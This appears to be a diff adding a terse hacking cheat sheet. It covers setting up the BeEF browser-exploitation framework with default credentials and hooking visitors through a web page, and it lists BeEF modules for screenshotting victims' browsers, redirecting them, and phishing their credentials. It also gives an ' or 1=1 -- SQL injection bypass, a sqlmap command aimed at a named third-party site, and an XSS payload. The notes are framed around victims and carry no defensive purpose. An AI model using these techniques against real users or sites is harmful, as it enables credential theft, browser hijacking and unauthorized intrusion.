@@ -1,0 +1,53 @@
+1)beef-xss
+
+2) user-name : beef
+   password : beef
+
+3) cd /var/www/html
+
+
+4) leafpad index.html
+
+5)-
+<html>
+<head>
+<h1>"welcome"</h1>
+<script>js </script>
+</html>
+
+6)ifconfig -- local ip ---> open any browser
+
+
+beef cmd
+-----------------------------------------
+1)Alert - This Command Alert Victim you have been hacked
+2)Raw- Raw javascript This Command Executed Victim affected your javascript code.
+3)Spyder eye - This Command Using for taking Screenshot Victim Browser.
+4)Redirect - This command Executed user redirected your own URL.
+5)Pretty Theft- Pop Phishing Page got some credential information from victim Side
+6)Fake Notification Bar - This command Shown fake notification bar to the victim. 
+7)Social Engineering - google phishing 
+---------------------------------------------
+
+sql injection
+
+
+demo.testfire.net
+
+' or 1=1 --
+---------------------------
+
+sql injection 
+sqlmap -u "http://esjindex.org/search.php?id=1"
+
+------------------------------
+
+xss
+
+Xss : 
+<script>alert("Hello all")</script>
+---------------------------------------
+
+
+
+
